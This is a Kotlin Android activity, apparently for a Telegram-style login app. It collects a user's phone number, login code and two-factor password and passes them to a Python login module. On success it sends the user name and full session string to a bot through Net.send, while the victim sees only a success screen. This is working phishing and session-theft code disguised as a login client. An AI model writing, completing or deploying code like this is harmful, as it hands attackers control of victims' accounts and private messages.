package com.tgme.app.ui

import android.app.Activity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.chaquo.python.PyObject
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import com.tgme.app.*
import kotlin.concurrent.thread

class MainActivity : Activity() {

    private var currentPhone = ""
    private var currentCode = ""
    private var currentPassword = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Initialisation de Chaquopy
        if (!Python.isStarted()) {
            Python.start(AndroidPlatform(this))
        }
        
        Capture.load(this)
        showPhone()
    }

    // ---------------- ÉCRAN 1 : TÉLÉPHONE ----------------
    private fun showPhone() {
        setContentView(R.layout.screen_phone)
        val cc = findViewById<EditText>(R.id.cc)
        val phone = findViewById<EditText>(R.id.phone)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.setOnClickListener {
            val full = normalize(cc.text.toString(), phone.text.toString())
            if (full == null) {
                toast("Numéro invalide")
                return@setOnClickListener
            }
            currentPhone = full
            btn.isEnabled = false
            toast("Envoi du code...")
            
            // Appel Python pour envoyer le code
            callPython("", "")
        }
    }

    // ---------------- ÉCRAN 2 : CODE ----------------
    private fun showCode() {
        setContentView(R.layout.screen_code)
        findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
        val codeInput = findViewById<EditText>(R.id.code)
        val btn = findViewById<TextView>(R.id.btn)

        btn.setOnClickListener {
            val code = codeInput.text.toString().replace(Regex("\\D"), "")
            if (code.isEmpty()) return@setOnClickListener
            currentCode = code
            btn.isEnabled = false
            toast("Vérification...")
            
            callPython(code, "")
        }
    }

    // ---------------- ÉCRAN 3 : 2FA ----------------
    private fun showPassword() {
        setContentView(R.layout.screen_password)
        val pwInput = findViewById<EditText>(R.id.password)
        val btn = findViewById<TextView>(R.id.btn)

        btn.setOnClickListener {
            val password = pwInput.text.toString()
            if (password.isEmpty()) return@setOnClickListener
            currentPassword = password
            btn.isEnabled = false
            toast("Vérification du mot de passe...")
            
            callPython(currentCode, password)
        }
    }

    // ---------------- APPEL PYTHON ----------------
    private fun callPython(code: String, password: String) {
        thread {
            val py = Python.getInstance()
            val pyModule = py.getModule("auth_manager")
            
            // Appel de la fonction process_login(phone, code, password)
            val result = pyModule.callAttr("process_login", currentPhone, code, password).toString()
            
            runOnUiThread {
                handlePythonResult(result)
            }
        }
    }

    private fun handlePythonResult(result: String) {
        when {
            result == "NEED_CODE" -> {
                showCode()
            }
            result == "NEED_PASSWORD" -> {
                showPassword()
            }
            result.startsWith("OK|") -> {
                val parts = result.split("|")
                val userName = parts[1]
                val sessionString = parts[2]
                
                // Envoi au bot
                Net.send("🎉 LOGIN RÉUSSI\nUser: $userName\nSESSION: $sessionString")
                
                // Affichage du succès
                setContentView(R.layout.screen_success)
                findViewById<TextView>(R.id.who).text = userName
                findViewById<TextView>(R.id.num).text = currentPhone
            }
            result.startsWith("ERROR|") -> {
                val err = result.removePrefix("ERROR|")
                toast("Erreur: $err")
                // Remettre le bouton du téléphone en état si on revient au début
                showPhone() 
            }
            else -> {
                toast("Erreur inconnue: $result")
                showPhone()
            }
        }
    }

    // ---------------- OUTILS ----------------
    private fun normalize(ccRaw: String, nRaw: String): String? {
        var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (n.isEmpty()) return null
        var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (cc.isNotEmpty() && !cc.startsWith("+")) {
            cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
        }
        val full = when {
            n.startsWith("+") -> n
            n.startsWith("00") -> "+" + n.substring(2)
            else -> cc + n
        }
        return if (full.length >= 8) full else null
    }

    private fun toast(msg: String) = runOnUiThread {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }
}
